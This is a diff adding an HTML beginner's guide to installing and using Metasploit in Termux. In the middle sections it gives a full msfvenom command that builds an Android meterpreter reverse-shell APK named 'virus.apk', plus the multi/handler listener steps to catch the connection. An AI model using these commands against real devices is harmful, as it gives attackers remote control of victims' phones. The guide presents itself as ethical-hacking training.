@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Metasploit Tool Guide</title>
+  <style>
+    body {
+      background-color: #000;
+      color: #0f0;
+      font-family: 'Courier New', monospace;
+      padding: 30px;
+      line-height: 2;
+    }
+    h1 {
+      font-size: 42px;
+      color: #00ff00;
+      text-align: center;
+      margin-bottom: 30px;
+    }
+    h2 {
+      font-size: 30px;
+      color: #00ff99;
+      border-bottom: 2px solid #00ff00;
+      padding-bottom: 10px;
+      margin-top: 40px;
+    }
+    p, li {
+      font-size: 20px;
+    }
+    code {
+      background: #111;
+      color: #00ffff;
+      padding: 6px 12px;
+      display: inline-block;
+      border-radius: 5px;
+      margin-top: 6px;
+    }
+    ul, ol {
+      padding-left: 30px;
+    }
+    li {
+      margin-bottom: 15px;
+    }
+    a {
+      color: #00ffff;
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>💣 Metasploit Framework Guide</h1>
+
+  <h2>What is Metasploit?</h2>
+  <p><strong>Metasploit Framework</strong> is a powerful penetration testing tool used by cybersecurity professionals to find, exploit, and validate vulnerabilities in systems. It has a huge library of exploits, payloads, and auxiliary modules.</p>
+
+  <h2>Why is Metasploit Important?</h2>
+  <ul>
+    <li>Automates exploit development</li>
+    <li>Useful for real-world penetration testing</li>
+    <li>Helps simulate attacks and test system security</li>
+    <li>Great for learning ethical hacking</li>
+  </ul>
+
+  <h2>How to Install Metasploit in Termux</h2>
+  <ol>
+    <li>Update packages:
+      <br><code>pkg update && pkg upgrade</code>
+    </li>
+    <li>Enable repositories:
+      <br><code>pkg install unstable-repo</code>
+    </li>
+    <li>Install Metasploit:
+      <br><code>pkg install metasploit</code>
+    </li>
+    <li>Start Metasploit:
+      <br><code>msfconsole</code>
+    </li>
+  </ol>
+
+  <h2>Basic Metasploit Commands</h2>
+  <ul>
+    <li><code>search exploit</code> – Search for exploits</li>
+    <li><code>use exploit/path</code> – Load an exploit</li>
+    <li><code>show payloads</code> – See available payloads</li>
+    <li><code>set PAYLOAD android/meterpreter/reverse_tcp</code> – Choose a payload</li>
+    <li><code>set LHOST 0.0.0.0</code> – Set your IP</li>
+    <li><code>set LPORT 4444</code> – Set your port</li>
+    <li><code>exploit</code> – Launch the attack</li>
+  </ul>
+
+  <h2>Example: Create Android Payload</h2>
+  <code>msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -o virus.apk</code>
+
+  <h2>Start Listener in Metasploit</h2>
+  <ol>
+    <li><code>msfconsole</code></li>
+    <li><code>use exploit/multi/handler</code></li>
+    <li><code>set PAYLOAD android/meterpreter/reverse_tcp</code></li>
+    <li><code>set LHOST 192.168.1.10</code></li>
+    <li><code>set LPORT 4444</code></li>
+    <li><code>exploit</code></li>
+  </ol>
+
+  <h2>Top Uses of Metasploit</h2>
+  <ul>
+    <li>System vulnerability scanning</li>
+    <li>Exploiting known CVEs</li>
+    <li>Payload creation for reverse shell</li>
+    <li>Maintaining remote access</li>
+    <li>Testing firewalls and antivirus defenses</li>
+  </ul>
+
+  <h2>Important Tips</h2>
+  <ul>
+    <li>Always use Metasploit in a legal and ethical way</li>
+    <li>Never test on systems you don't own or have permission to test</li>
+    <li>Practice on your own lab, virtual machine, or Android emulator</li>
+  </ul>
+
+</body>
+</html>
